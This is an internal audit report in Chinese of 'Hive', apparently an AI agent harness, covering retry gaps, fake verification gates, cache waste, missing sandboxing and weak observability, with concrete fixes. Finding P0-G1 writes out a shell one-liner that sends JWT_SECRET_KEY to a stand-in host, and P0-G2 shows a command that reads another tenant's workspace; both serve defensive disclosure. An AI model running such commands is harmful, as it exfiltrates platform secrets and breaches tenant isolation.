# Hive Harness 工程全面审计 — 2026-06-11

> **范围**:以 Anthropic / OpenAI / 社区三方的 Harness 工程定义与实践为基准,对 Hive 全工程(内核循环、上下文工程、行动治理、记忆与自进化、长任务持久执行、可观测与评估)做控制元素级对照审计。
> **方法**:3 路外部基准研究(全部一手来源,URL 在附录 B)+ 6 路内部分区审计(全部断言带 file:line,生产接线核实优先于代码存在性)+ 主审对每个分区最高严重度 P0 亲读代码复核。本文已在 2026-06-12 按当前 HEAD 做校准性复核,但仍建议每个 P0 修复前按 §11 重新执行命令确认。
> **基线**:原审计草稿基于 main @ 3cade6ef(RLS stage-2c 后);本版校准到 main @ aac4044a(`fix frontend auth 401 messaging`)。3cade6ef 之后已包含 RLS stage-3 role flip、URL normalization、role DDL cast、background backfill、frontend auth 401 messaging 等修复,因此 RLS 相关文字按「事故复盘 + 当前待验项」表达,不把旧快照当当前事实。
> **与 06-09 审计的关系**:上次总判「内核真/边缘假/地基洞」,其 6 phase 修复已验证仍在线(compaction P0-P2、T-G1/G2/G3.1、治理链等逐项复核通过)。本次审计在更深的 harness 维度发现新的一层,与上次不重复。

---

## 0. 一句话总判

**单个器官对标到位、局部超越 CC;但 harness 工程的另一半——失败路径与跨器官闭环——系统性缺位。**

Hive 今天是一台**晴天机器**:每个部件(循环、压缩、治理、记忆、journal、队列)都认真对标了 CC 的晴天形态,其中 LoopGuard 三通道、transient reminder、extract queue、workflow journal 甚至超出 CC。但三方基准一致指出 harness 价值的另一半在雨天:CC 约四成循环代码在处理「出错之后怎么活下来」(10 次退避重试、tombstone、输出 cap escalate、中断接续);OpenAI / LangGraph 体系把 durable execution、trace、human review、state checkpoint 作为运行时基本面;社区长任务实践 TOP1 是「状态外置 + 重放即恢复」。这一半在 Hive 仍明显不足:**HTTP 层 provider overload/rate-limit 一击毙命、撞输出 cap 静默断尾、进程重启误杀全部 in-flight workflow、协调信号总线两头死线、30 秒默认超时掐死一切长工具**。

同时浮现本仓库病根「绿测试≠完成」的全景版:**至少 11 处 built-but-unwired / built-but-fake 死线**(详见 §7),其中进化闭环的「验证门」实质是同义反复+LLM 自评——这比没有门更危险,因为它向 owner 发出虚假的「已验证」信号。

三大北极星现状:**①基础框架对齐 CC——晴天面 ~85% 对齐+局部净超越,雨天面系统性缺位,综合「结构对齐、韧性未对齐」;②记忆+自进化超越 CC——基础设施层(治理/纯净/可逆/审计)真超越,体感层(学习时延/读侧智能/技能修补)反而落后于 CC 与 hermes,且唯一的「已超越」证据(bakeoff)是字符串存在性检查,不可采信;③企业级管控——治理链与权限模型合格,但执行隔离(env 密钥透传+无 OS 沙箱)与资源管控(预算 enforcement 是死代码)两个地基洞使 Goal-2 当前仍不成立。RLS role-flip 已暴露过 pre-auth 401 事故;后续提交修了部分显性故障,但仍需按当前 HEAD 重跑生产级验收,不能仅凭提交存在性宣称完成。**

多数 P0 是收敛性修复(过滤一行、统一一个 gateway、补一张 timeout 表、接通一个消费者),但 sandbox/code-mode、trace spine、quota enforcement、RLS 二次验收、thinking 签名链属于系统性工程,不能压成「小补丁」。修完这些闭环后三大北极星才有资格进入达成验收。

---

## 1. 基准:三方对 Harness 的定义与控制元素

### 1.1 三方定义(各取核心)

**Anthropic**(无一句式定义,操作性三层):harness = 围绕 agent loop(gather context → take action → verify work → repeat)的脚手架,提供工具、上下文管理、权限框架、subagent、hooks;长程场景下 harness = 跨上下文窗口工作的基础设施;且「**harness 中的每个组件都编码了一个关于模型做不到什么的假设**」——模型变强,组件应删。边界:思考归模型,行动边界归 harness。

**OpenAI**(两层定义,2026-02 两篇 Codex 文章):结构上 harness = 「the agent loop and logic that underlies all Codex experiences」,四部分 = 核心循环 + Thread 生命周期与持久化(create/resume/fork/archive)+ Config/Auth + 沙箱内工具执行与统一策略模型;职能上「**Humans steer. Agents execute.**」——工程师的工作变成 design environments, specify intent, build feedback loops。关键趋势:OpenAI 持续把智能面(compaction、planning)下沉进模型权重,harness 剩下**治理面**——与 Hive 的 L1/L2 分层同向。

**社区**(共识公式):`Agent = Model + Harness`,「如果你不是模型,你就是 harness」。Fowler 站分法:**Guides(前馈:AGENTS.md、架构文档)+ Sensors(反馈:linter、测试、review)**。thin vs thick 之争的可操作落点(Osmani 综合派):harness 不会变薄只会迁移,**每个组件必须标注它补偿的模型缺陷,缺陷消失即删**——与 Hive AI-Native L1 同构。

### 1.2 关键基准参数(审计中实际使用的尺子)

| 控制域 | 基准尺子(出处见附录 B) |
|---|---|
| 失败路径 | CC `withRetry`:默认 10 次、指数退避 500ms→32s+jitter、尊重 retry-after 头、529 三连切 fallback model、无人值守模式可无限重试;输出 cap:64K escalate → 3 次 resume 续写才暴露错误 |
| 上下文经济 | CC token 计量 canonical = 最后一条 assistant 的真实 API usage + 增量估算;Manus:KV-cache 命中率 =「生产 agent 第一指标」(cached $0.30 vs uncached $3/MTok);压缩必须可恢复(留指针)而非有损丢弃 |
| 沙箱 | Codex 默认态 OS 级 fail-closed(Seatbelt/seccomp+默认断网,审批是「脱沙箱」例外通道);CC sandbox 弹窗削减 84%;社区多租户基线上移到 microVM(E2B Firecracker 独立内核) |
| 持久执行 | Temporal:每次 LLM/工具调用 = activity 持久化,崩溃后从最后完成步恢复且**不重复已执行的外部动作**;LangGraph:每 super-step 检查点;OpenHands:append-only 事件溯源「重放即重建」 |
| 编排 | CC subagent 摘要回传 1,000-2,000 tokens 契约;Agent Teams 共享任务表+mailbox;委托契约四要素(objective/output format/工具指引/boundaries);Cognition:默认单线程,并行只接可独立验证分片 |
| 可观测 | OpenAI Agents SDK tracing 默认开:Trace→Span(generation/function/guardrail/handoff)全链 trace_id 贯通;企业控制面五件套 = 身份、生命周期、权限、预算、审计,且「动作发生点强制 + append-only」 |
| 验证收敛 | Anthropic:独立 evaluator 苛刻打分、任一项低于硬阈值即回炉;社区:「外部验证判停,禁止自评完成」(Ralph loop 的 Generator/Judge 分离) |
| 记忆 | CC auto memory:MEMORY.md 索引(200 行/25KB 上限)+ 回合末 forked agent LLM 提取直写 + Sonnet manifest 选择器动态 recall;hermes:回合末 fork 完整 LLM agent 判断「该学什么」、第一优先动作 = patch 当前已加载技能、记忆工具含 replace/remove |

---

## 2. 九域对照总表

| # | 控制域 | 对齐状态 | 一句话 |
|---|---|---|---|
| 1 | 循环控制 | 🟡 骨架对齐+局部超越,失败路径缺位 | 200 轮+压力提醒+LoopGuard 三通道超出 CC;重试矩阵/输出 cap 恢复/steering/可中断性系统性缺失 |
| 2 | 上下文控制 | 🟡 压缩主干对齐,三个机制级误读出血 | compaction P0-P2 在线且恢复语境分层优于 CC;cache boundary 语义误读+字符估算无真实锚+microcompact 温 cache 挖洞 |
| 3 | 行动治理 | 🟢 链路完整 fail-closed / 🔴 执行隔离缺位 | 治理链无绕过、权限粒度企业合格;但 run_command/execute_code 无沙箱+env 全透传 |
| 4 | 任务编排 | 🟡 原语齐全,被 30s timeout 与信号死线困住 | subagent/workflow/plan/trigger 全有且对标过;spawn_subagent 同步 30s 必死、完成信号无人听 |
| 5 | 状态持久化 | 🟡 器官真实,循环未连通 | workflow journal/extract queue 教科书级;reconciler 误杀+once 至多一次+resume context 零消费 |
| 6 | 记忆 | 🟢 治理面真超越 / 🟡 体感面落后 | 写门/生命周期/审计/SOP 质量碾压 CC 与 hermes;学习时延 2h、读侧半死权重、技能不被修补 |
| 7 | 自进化 | 🔴 闭环最后一跳断线+假验证门 | candidate/ledger/manifest 结构对;verification 同义反复、fast_reflection 机械、晋升 = LLM 自评 |
| 8 | 可观测 | 🔴 审计型有、运维型无 | 合规审计四表+hash 链铺得密;trace/可导出 metrics/成本全覆盖/持续 eval 四根柱子一根没立 |
| 9 | 人机协作 | 🟡 审批可用但偏离基准 | 审批接线+飞书卡;非阻塞 fire-and-forget 不回流原会话,与 CC ask/OpenAI approval-resume 模型不同 |

---

## 3. P0 发现(15 条,按主题组织)

### 3.1 失败路径工程(「雨天裸奔」)— 5 条

**P0-K1 HTTP status 错误无有效重试,429/529 一击毙命,且客户端「HTTPStatusError 重试分支」是死代码**(主审已亲核)
- 现状:`OpenAICompatibleClient.stream` 对 HTTP≥400 直接 `raise LLMError`(`llm_client.py:629-633`);下方 429 退避分支(:685-697)捕获 `httpx.HTTPStatusError`,但该 status 路径没有 `raise_for_status()` —— **该分支不可达**。网络连接/读取异常仍有 3 次 retry,所以问题不是「所有瞬态错误零重试」,而是 HTTP 429/529/5xx 这条最关键的 provider overload/rate-limit 路径没有有效 retry matrix。内核层无同模型退避重试;429/529/quota/auth 被 `classify_llm_error` 标为 `requires_user_decision` 后**连 fallback model 都被禁止**(`engine.py:2074-2077`)。语义与 CC 恰好反转:CC 在 529 上强制 fallback,Hive 在 529 上禁止一切自动恢复。
- 基准:CC `withRetry` 默认 10 次、指数退避+jitter、尊重 `retry-after`/`anthropic-ratelimit-unified-reset` 头、529 三连切 fallback、无人值守 persistent-retry 模式。
- 影响:一次 HTTP 层 overload / rate-limit 即可杀死 web chat run / trigger / heartbeat。这是「企业级无人值守数字员工」与 CC 基线之间最大的可靠性断层。
- 修复:客户端层补 withRetry 等价物(分类驱动:429/529/5xx/连接/超时可重试,quota/auth/404 不可重试);「须用户决策」收窄为「禁换模型但允许同模型重试」;daemon 源加 persistent 模式;删死代码。

**P0-K2 Anthropic 原生 thinking 多轮签名链断裂——内核丢签名、客户端伪造 `"synthetic_signature"`**(主审已亲核)
- 现状:assistant 回合写回历史只带 `reasoning_content`,丢弃 `reasoning_signature`(`engine.py:2272-2279`);`to_anthropic_format` 回放时 `"signature": self.reasoning_signature or "synthetic_signature"` **伪造签名**(`llm_client.py:73-78`);无 interleaved-thinking beta 头。
- 基准:CC thinking 三法则(`query.ts:151-163`):签名 model-bound,fallback 时 `stripSignatureBlocks` 剥除——宁剥不伪造。
- 影响:**基准模型家族(Claude)在 Hive agent loop 里多轮 thinking 实际不可用**(伪造签名 → API 400 → 按 P0-K1 链路杀 run)。同时违反 L1(削弱模型思考)与 L3(Claude 被劣化 = 模型不平等)。
- 修复:补签名透传;无签名时不发 thinking block(对齐 CC);序列化链补字段。

**P0-D1 startup 孤儿 reconciler 无差别击杀 workflow 的跨进程恢复**(主审已亲核)
- 现状:`reconcile_orphaned_runtime_tasks` 把**所有** `status=="running"` 的 RuntimeTask 标 failed(`runtime_task_service.py:222`,select 无 task_type 过滤);它在 `main.py:345-352` 先执行,workflow daemon 的 `resume_pending_runs`(只扫 running/suspended)在 :~470 后启动。**进程死亡时 in-flight workflow(含 Deep Research)先被改成 failed,daemon 永远接不到**——P0-P13 建好的 journal 重放/advisory-lock/外部步 reconciliation 在最需要的场景(每次 Railway 部署)被自家启动逻辑打穿。
- 修复:reconciler 加 `task_type != "workflow"` 过滤(workflow 孤儿判定交给 daemon 的 lease)。**一行级修复,价值极大。**

**P0-D2 协调 Signal 写/读 split-brain:父唤醒与 workflow 完成通知在默认配置下双死线**
- 现状:`COORDINATION_BACKEND` 默认 `"memory"`(`config.py:169`)。写侧落进程内 singleton(`coordination.py:251`),workflow 完成信号更是硬编码写内存(`workflow_runtime_service.py:944-961`);而 daemon 消费方 `drain_subagent_completion_wakes`/`drain_signal_resumes` **只读 PG 表**;in-run 消费方又硬编码读内存。两种配置各死一条线;`workflow_completed` 信号**生产零消费方**。这是 [[绿测试≠完成]] 的又一实例(测试注入绕过生产接线)。
- 修复:生产与消费统一经 `pick_gateway`;`_emit_completion_signal` 改走 gateway;startup 加配置一致性断言。

**P0-D3 同步长工具被 30 秒默认 timeout 必杀:spawn_subagent / start_workflow / deep_research_run**(主审已亲核)
- 现状:`ToolRuntimeService.execute` 对所有工具 `asyncio.wait_for(timeout=_TOOL_TIMEOUTS.get(tool_name, 30.0))`(`tools/service.py:304-330`),三个长工具都不在覆盖表;`spawn_subagent` 同步等子代理整跑完(工具面无 background 参数,`run_in_background` 能力存在但不可达);子代理单轮 LLM call 的 httpx timeout 就有 120s。**subagent 源能力实际无法承载任何非平凡同步任务**(只有 <30s 的短任务才活,这正是它「看似可用」的原因)。结构性矛盾:工具层 timeout < 单次 LLM call timeout。
- 修复:ToolMeta 加 timeout 字段或长任务白名单升分钟级;spawn_subagent 暴露 run_in_background;同步 DR 路由到后台。

### 3.2 执行隔离与资源管控(Goal-2 地基)— 2 条 + RLS 现状

**P0-G1 代码/Shell 执行把全平台密钥透传给 agent,跨租户全线击穿**
- 现状:`_prepare_execution_environment` 用 `safe_env = dict(os.environ)` 只覆盖 HOME 等两项(`code_exec.py:101`),子进程能读 `JWT_SECRET_KEY`/`SECRETS_MASTER_KEY`/`DATABASE_URL` 及所有 API key。黑名单不拦 `python3/node`;一条 `run_command("python3 -c 'import os,urllib.request; urllib.request.urlopen(\"http://x/\"+os.environ[\"JWT_SECRET_KEY\"])')` 同时绕开两层。`JWT_SECRET_KEY` 泄漏 = 伪造任意租户 token;`SECRETS_MASTER_KEY` 泄漏 = 解密所有租户落库 secret。
- 基准:CC seatbelt/bubblewrap + env 白名单;Codex 默认沙箱不继承宿主 secret。
- 修复:子进程 env 改显式白名单(PATH/HOME/LANG + 显式注入项),剔除一切 `*_KEY/*_SECRET/DATABASE_URL/*_TOKEN`;长期上 OS 沙箱(见 G2)。

**P0-G2 无 OS 级沙箱;共享容器内 run_command 可越权读其他 agent/租户工作区**
- 现状:`asyncio.create_subprocess_exec` + `cwd=workspace/`,无 chroot/namespace/seccomp;路径防护只拦字面量 `"../../"`(`code_exec.py:85-92`)。`cat /data/agents/<other_agent_id>/soul.md`(绝对路径零 `..`)不被拦。**RLS 只保护 Postgres 行,不保护文件系统**;文件层工具的 `startswith(ws.resolve())` 校验在 shell 路径被彻底绕过。配套问题 P1-G5:execute_code 工具描述宣称「No network access」实际只是可绕过的字符串黑名单——L2 法律违例(harness 约束是摆设,security theater)。
- 基准:Codex OS 级 fail-closed 默认态;社区多租户基线 = microVM(E2B Firecracker)/gVisor(Modal)。
- 修复:短期 mount-namespace+只读绑定挂载到单一 agent 目录(Linux bwrap 可用);中期评估执行类工具整体外置到隔离服务;同步修正工具描述失实宣称。

**RLS 现状(进行中主线,非新发现,但有新实战教训)**:role-flip 在 2026-06-11 暴露过 pre-auth 登录 401 事故——根因是 login 等 pre-auth 查询无租户上下文时触发 GUC fail-closed。当前 HEAD 已在 3cade6ef 之后追加多次修复(URL normalization、role DDL cast、background backfill、frontend auth 401 messaging),但本审计没有重新连接生产验证「role flip 已完成」。因此本段应作为**事故复盘与二次验收清单**,不是当前生产状态断言。再翻/再验必修:①pre-auth 路径(login/register/SSO/邀请码)走明确审计的 `enter_rls_bypass` 或等价 owner/pre-auth accessor ②验证 `SET LOCAL` 在 handler mid-commit 后不会蒸发 ③flip 后验真实登录+核心 CRUD+跨租户红队,而非只验隔离。本次审计补充两个 RLS 耐久性缺口:**P1-G4 无 CI/AST 守卫拦截新增 bare `async_session()`**(迁完 184 处后无机制防回潮,整个迁移的耐久性依赖一个不存在的守卫);**P2-G10 `enter_rls_bypass` 偏宽**,含治理热路径(governance_resolver 每次工具治理都在 BYPASS 会话里查 Agent)。

### 3.3 进化闭环的诚实性(假门与死线)— 3 条

**P0-M1 「verification→promotion」是装样子:同义反复检查 + LLM 自评晋升**
- 现状:①skill_flywheel 唯一 grader 是 `state_check contains "status: candidate only"`——该字符串是 3 行前模板自己写进去的,**验证恒真**(`skill_flywheel.py:120-130`);②`_run_llm_rubric_check` 不调 LLM,只透传调用方预填的 `passed` 布尔(`evolution_verification.py:114-121`);③`decide_verified_promotion` 零生产调用方;④真正晋升技能的 skill_distiller 先落盘再 `record_eval_run(reward=draft.confidence, passed=True)` 恒过——**晋升门 = LLM 自报 confidence ≥0.85,ledger 是事后记账不是门**。
- 基准:sota-plan 自己的 §8「Do not use LLM self-judgment as the only verifier」;社区「外部验证判停,禁止自评完成」。
- 影响:P3「Verification-gated Promotion Completed」声明实质不成立;给 owner 的「已验证」信号是假的,**比没有门更危险**。
- 修复:distiller 晋升前接真 grader(deterministic:技能 lint+加载烟测,或 human confirmation 经 evolution_view);llm_rubric 透传如实改名或删;flywheel 撤同义反复 grader。

**P0-M2 fast_reflection 全链机械化(L1 违例)且终端产物无消费者**
- 现状:信号分类 = 字符串 marker 匹配为主路径(含「不是」/「failed」等中文高频词,`fast_reflection_service.py:18-35`),无 LLM 参与;技能草稿 = Python 模板渲染;产出的 `evolution/skill_candidates/<id>/SKILL.md` **全仓无读取方**。链路有效产物只剩 60min TTL 的 session projection。
- 基准:hermes 每回合 fork 完整 LLM agent(继承 prompt cache)用高质量 prompt 判断「该学什么」(`background_review.py:34-145`)。
- 修复:分类步换小模型侧查询(与 retriever rerank 同模式),机械 marker 降级为可观测兜底;死草稿目录砍掉或接通消费者。

**P0-M3 DREAM.md 模板死线 + 测试钉死幽灵**
- 现状:`_DREAM_TEMPLATE_PATH` 定义后从未被 read_text(`auto_dream.py:1099`);生产 dream 走 `_AUTO_DREAM_SYSTEM_PROMPT` + `DREAM_CONSOLIDATOR.md`。而 `tests/runtime/test_dream_template.py` 专门钉 DREAM.md 内容、CLAUDE.md 宣称它有效;且模板教 agent 对 memory/ 用 write_file——与运行时铁律相悖,即便活着也走不通。
- 修复:删 DREAM.md+测试,或真接成 dream 的 SOP 入口(类比 heartbeat `_load_heartbeat_instruction`);同步改 CLAUDE.md。

### 3.4 上下文经济(cache 出血)— 2 条

**P0-C1 动态后缀寄生在 system message 内且逐回合变化 → 跨回合历史 cache 全灭(所有 provider)**(主审已亲核)
- 现状:dynamic suffix 拼进 system prompt 字符串(`prompt_builder.py:604-607`),每次 `handle()` 重建;逐回合必变字段:分钟级 UTC 时钟(`environment.py:348`)、秒级 agent 时区时钟(`agent_context.py:141-144`)、memory navigation 热度表的 `recall_count/last_recalled`(每次检索 `bump_access` 自增 → 必变)。CC 的 boundary 分隔的是「跨组织 cache scope vs 会话私有」,**两侧在会话内都字节稳定**;per-turn 动态全部走消息尾部 attachment。Hive 把 boundary 误读成「会话稳定 vs 每回合可变」。
- 影响:长会话里 history 占 token 大头,**每个用户回合全额重读**——Manus 口径下 10 倍成本差;所有 provider 同时出血(L3 语境下更严重)。
- 修复:per-turn 易变内容迁出 system,复用已有 transient 尾部通道(Anthropic 客户端已把尾部 system 降级为 user "[System Notice]",形态现成)。最小切口先迁时钟+热度表。

**P0-C2 压缩触发用纯字符估算(3.3-4.0 cpt,无 CJK 校准),从不用真实 usage → 中文会话被动 PTL 机械降级成为主路径**
- 现状:`current_tokens=estimate_tokens(...)` 字符除以 cpt(`memory_service.py:402`);kernel 每轮拿到 `response.usage` 只用于计费,从不回灌压缩触发。中文 ≈1.5 字符/token,3.5 cpt 低估 ~2.3 倍 → 75%/82% 阈值在真实窗口 ~170% 才满足 = **主动压缩近乎永不触发**,主路径退化为 PTL 反应式,而 PTL attempt 1-2 是机械掉头 20% 轮组(无 LLM 摘要、不触发 PRE_COMPACTION 抽取)——智能步骤的机械处理成为事实主路径,L1 违例。
- 基准:CC `tokenCountWithEstimation` = 最后一条 assistant 的**真实 API usage** + 新增粗估,注释明示 canonical。
- 修复:每轮把 `extract_usage_tokens(response.usage)` 写入会话状态作锚 + 增量估算(照搬 CC);ProviderSpec 给 CJK 部署校准 cpt。配套 P1-C3:microcompact 把 CC 的「会话空闲→cache 必已冷」触发语义误读为「单条结果年龄」,在温 cache 反复挖洞——改为距最后 assistant 消息 gap>60min 判定。

### 3.5 运维失明 — 3 条

**P0-O1 per-invocation trace 层不存在:LLM 调用零持久化、kernel 全文无计时**
- 现状:kernel 2800+ 行无任何计时——LLM 单轮延迟从未被测量;轮次数不落任何地方;`RuntimeTask.trace_id` 只在 subagent/delegation 线写,web chat/trigger/heartbeat 主路径不写;`SecurityAuditEvent.request_id` 列存在但 governance 6 处调用全不传。无法回答「这次 invocation 调了几轮、每轮多久、哪个工具慢」。
- 基准:OpenAI Agents SDK tracing 默认开,Trace→Span 全链贯通。
- 修复(最小方案):`invoke_agent()` 入口生成 invocation_id 挂 ContextVar;kernel 经 KernelDependencies 加 `record_span` 回调(与 record_token_usage 同构)发 generation-span/function-span 落一张 append-only `invocation_spans` 表;invocation_id 回填 activity detail/SecurityAuditEvent.request_id/DecisionTrace——审计链四店分裂(P2-O9)自动闭合。不必先上 OTel。

**P0-O2 DecisionTraceStore 纯内存 + 反馈→校准环路三级死线**(主审已亲核)
- 现状:内存 dict 挂进程单例(`decision_trace.py:35-38`),重启即失、多 worker 分裂、无租户隔离;`record_feedback` 生产零调用方 → `calibration_candidates()` 永空 → `propose_charter_calibrations_from_feedback` 也无生产调用方。CLAUDE.md 宣称的「owner feedback 链回 decision/<id>」能力在生产不存在。
- 修复:DecisionTrace 落 DB;接通 feedback 写入方或删死链并改 CLAUDE.md。

**P0-O3 token 计量约 12 条 LLM 旁路不入账,蒸馏烧钱账单不可见**
- 现状:`record_token_usage` 唯一接线点是 kernel;绕过 invoke_agent 直接 create_llm_client 的生产消费方(extract_agent/auto_dream/conversation_summarizer/memory_curation/compaction/session_recall/skill_distiller/retriever rerank/subagent_evolution/subagent_memory/subagent_generator/hr)全部不入账。每个 agent 每次回复触发 T2 提取、2h heartbeat、24h dream——持续后台支出对租户配额与平台账单完全不可见。
- 修复:在 `create_llm_client_from_config` 工厂(06-05 事故后已收敛的单点)统一挂 usage 回调,带 source 标签落账。配套 P1-O8:账本只有 3 个递增计数器,admin 时序图把全部历史用量记到 agent 创建日——**时序图是错误数据**;建 `token_usage_events` 日聚合表。

---

## 4. P1 重点(节选 15 条,完整清单见各分区报告)

| # | 发现 | 证据锚点 | 修复方向 |
|---|---|---|---|
| P1-1 | **预算 enforcement 是死代码**:`check_user_token_quota` 生产零调用,`quota_message=None` 写死;用量有记录无拦截,无 per-tenant 维度 | `quota_guard.py:24`/`invoker.py:219` | invoke_agent 入口按 user+tenant fail-closed 检查(Goal-2 硬门) |
| P1-2 | **运行中 steering 缺失**:mid-run 用户消息 HTTP 409,**WS 路径静默丢弃用户输入**(数据丢失级) | `web_chat_runtime.py:178-182`/`api/websocket.py:672` | 活跃 run 时消息持久化入队,kernel 每轮开头 drain(CC mid-turn drain 模式) |
| P1-3 | **输出 cap 静默截断确认**(挂账落实):stream 路径撞 cap 只记 metric,kernel 不读 finish_reason,escalate 仅存在于带工具即禁用的 complete() 路径 | `llm_client.py:312-339` | kernel 读 finish_reason → 同请求升 cap 重试 ≤65536 → resume meta 消息 ≤3 次(CC 模式) |
| P1-4 | **T2 不进检索,durable 记忆等 2h heartbeat**——「上一场教的这一场不知道」,体感差距的结构根源 | `retriever.py:225-252` | T2 高权重条目(w≥0.85 feedback/constraint)进检索候选池带 lane 标 |
| P1-5 | **技能没有任何「被经验修补」的生产通路**——只会新增和变陈旧,不会变好(hermes 第一优先动作正是 patch) | `skill_distiller.py:903-914` | distiller 的 patch_recommended 接 apply 通路(经候选+真验证门) |
| P1-6 | **Agent 无法纠正错误记忆**:工具只有 save/load/search,无 update/replace/remove(CC/hermes 均有) | `tools/handlers/memory.py` | 加 governed `update_memory`/`retire_memory`(复用 supersede 边+write gate) |
| P1-7 | **once trigger / detached plan 至多一次,失败即静默蒸发**:fire 前先 disable,失败不重置;detached plan 自 06-08 起就是 once trigger | `trigger_daemon.py:1536-1560` | fire 记 attempt、invocation 终态 ack 后才 disable(extract queue 模式) |
| P1-8 | **web chat run 重启后不自动续跑**:转录级数据全在(健康),缺「把 orphaned plan-handoff run 自动再起」的泵;queued plan 进程死后永久卡死 | `web_chat_runtime.py:688-748` | startup 对 plan-handoff orphan 自动重启+扫 queued plan |
| P1-9 | **长任务 resume context 基建 built-but-unwired**:`build_long_task_resume_context` 拼好 resume_prompt,唯一消费方是 admin 验证报告 | `long_task_runtime.py:177-240` | 接到 P1-8 的重启泵,否则删 |
| P1-10 | **异步任务完成无推送**:workflow/DR 完成边沿不通知(基础设施齐全唯独没接);CC background task 完成回注主循环 | `workflow_runtime_service.py:944-961` | 终态边沿调 notification/ChannelDelivery 或完成信号入 PG 唤醒发起 agent |
| P1-11 | **metrics 全内存零导出零告警**:06-05 事故只修了症状层(加日志),「有日志≠有人看见」结构原样;pyproject 零 observability 依赖 | `memory/metrics.py:1-11` | `/metrics` Prometheus 文本端点起步+首批告警(extract failure 比率) |
| P1-12 | **131 处 DEBUG 级吞错**,含 kernel 三个记忆 hook 派发点(RESPONSE_COMPLETE 失败=T2 断流,生产不可见)——精确复刻 06-05 模式 | `engine.py:2254/2777/2843` | 三处升 WARNING+计数器;131 处按管线关键度分批 |
| P1-13 | **eval 体系无 CI 无行为 eval 无分数时序**;bakeoff 双方分数都是源码字符串存在性检查,「92 vs 85」不可作任何北极星证据 | `self_evolution_bakeoff.py:17+` | ①GitHub Actions 跑现有 pytest+prompt_eval ②P7 重做成行为级双系统实跑 |
| P1-14 | **HITL 审批不回流**:fire-and-forget,批准后动作脱离原会话执行,结果不回流 agent 推理;两套系统(7d ApprovalRequest vs 30min Checkpoint)割裂 | `approval_service.py:117` | 统一 Checkpoint 模型+交互式来源同会话 resume(结果作 tool_result 注回) |
| P1-15 | **多实例防双跑 fail-open**:trigger fire 的 Redis lease 异常时 `return True` 放行;heartbeat 同病;web chat 互斥非原子 | `trigger_daemon.py:794-807` | 不可重复动作 lease 失败 fail-closed,或统一搬 PG advisory lock(现成) |

其余 P1(摘要):流式中断重试内容重复缺 tombstone(`llm_client.py:700-709`,OpenAI-compatible 路径污染转录与 T2 输入);聚合预算超限纯截断无 spill 且豁免工具绕过 200K 预算(`engine.py:2645-2659`);cache 命中率观测死代码(`prompt_cache.py:233` 零消费);记忆双检索双注入(§Memory 与 §Knowledge 各一份);assembler 分数感知裁剪被二层机械字符斩断覆盖;D6 残洞(机械 repeated-feedback lane 不过 frozen-Mission 矛盾门,`auto_dream.py:1267-1402`);activation 6 权重 ~3.5 个死(retention_score 无写入方、conf/confidence 键不匹配);检索无持续 eval 且 PPR 不在主检索路;health 端点恒真+daemon 无 liveness;IM 通道轮次完全无 durable run 包装。

---

## 5. P2 与其余(简表)

工具并行 all-or-nothing(CC 分段并行,混合批 Hive 全串行)·取消不穿透工具执行(Stop 最长等 180s,外部副作用照常完成)·PTL 恢复顺序机械先于 LLM(与 CC 相反)·round 耗尽终态体验割裂(冷错误 vs LoopGuard 友好续跑话术)·缺 turn 级 token 预算/refreshTools/文件外部变更 attachment/空 tool result 防御·prompt sections 同规则多处陈述(三振规则 2 处表述不一)·双时钟双时区同框·压缩取回指针指目录非精确文件·SECRETS_MASTER_KEY 缺省明文落库无生产守卫·审批权限排除 org_admin(creator 缺席卡死 7 天)·delegation 不显式传 execution_identity 靠 ContextVar 渗透·审计 hash 链可并发分叉且不覆盖 details·日志非 JSON+daemon 路径 trace_id 逐行随机化(比没有更糟)·工具观测无 duration+读类工具零审计·team_memory 不走 write_gate·记忆内容无 prompt-injection 机械兜底(hermes `_MEMORY_THREAT_PATTERNS` 可直接借)·heartbeat lane 标记失真·DR 进程内 dedup dict 重启即失。

---

## 6. 北极星三判定

### 6.1 「基础 agent 框架对齐 CC」——结构对齐成立,韧性未对齐

晴天面:统一入口、轮循环、压缩主干(P0-P2 逐项验证仍在线)、transient reminder(数值 10/10/5 与 CC 对齐)、截断/溢出数值面(50K/200K/keep5/60min 全部源自 CC)、prompt sections 骨架与 CC 静态段 1:1、plan/task/subagent/trigger 历次对标全部真实落地(trigger 三桶+objective 退役经本次复核 **100% 执行无漂移**)。净超越项见 §9。

雨天面是系统性缺口:重试矩阵(CC 10 次退避+分类驱动 vs Hive 仅网络连接/读取异常 3 次裸重试,429/5xx 零有效重试)、输出 cap 恢复(64K escalate+3 次 resume vs 静默断尾)、流中断恢复(tombstone vs 内容重复)、签名保真(剥除 vs 伪造)、steering(mid-turn drain vs 409/WS 丢弃)、可中断性(synthetic tool_result vs 等 180s)。**判定:对齐工作的下一仗不在功能面,在失败路径面。**

### 6.2 「记忆+自进化超越 CC 源码」——基础设施层成立,体感层不成立且无证据

真超越的五个维度(CC 源码核实其一概没有):写入纯净(write_gate/PL 分级/lane/lifecycle sidecar)、可逆生命周期(heat/退役/cap/archive)、审计(ledger/rollback_ref)、蒸馏 SOP 质量(HEARTBEAT.md 与 dream prompt 的 few-shot+反模式+决策矩阵明显优于 CC extractMemories 朴素 prompt)、多租户。D1-D10 纯净化债:**6 已修、2 部分修(D5/D6 各留旁路)、2 代码就绪待生产执行(D2/D8)**——owner 的「债清掉结构就回来」在代码层基本兑现。

落后的两个体感维度:①**学习时延**——CC 回合末 forked agent 直写 durable、下场即可见;Hive durable 要等 2h heartbeat 且 T2 不进检索;②**读侧智能**——CC 主路径是 Sonnet manifest 选择器(LLM 判断);Hive 主路径是关键词 overlap+半死的 activation 权重,LLM rerank 只是窄条件侧路。且多跳管线复杂度已兑现成 4 处断点(DREAM.md 死模板/verification 同义反复/retrieval_eval 无调用/activation 死权重)——CC 的单跳架构没有这类故障模式。

对 hermes:平台治理碾压(hermes 几乎零治理);单 agent 智能体验落后,差距可枚举且全在闭环最后一跳——①次回合学习时延 ②技能永不被修补(hermes 第一优先动作)③错误记忆无法即时纠正 ④「该学什么」hermes 给完整 LLM、Hive 给字符串 marker。**是接线工程,不是再设计。修 M1/M2/P1-4/P1-5/P1-6 五条,此北极星即可达。在此之前不要宣称「已超越」——bakeoff 的 92 vs 85 是字符串检查,双方都不是行为分。**

### 6.3 「企业级管控(权限+多租户隔离)」——治理链合格,两个地基洞+RLS 待二翻

合格面:治理链结构完整无绕过(唯一旁路入口零生产调用方)、fail-closed 严谨、权限模型粒度(role×agent×capability×zone)企业够用、A2A 强制同租户、文件/Redis/MCP 隔离健康、secrets 加密(Fernet+HKDF)与 API mask 在线。

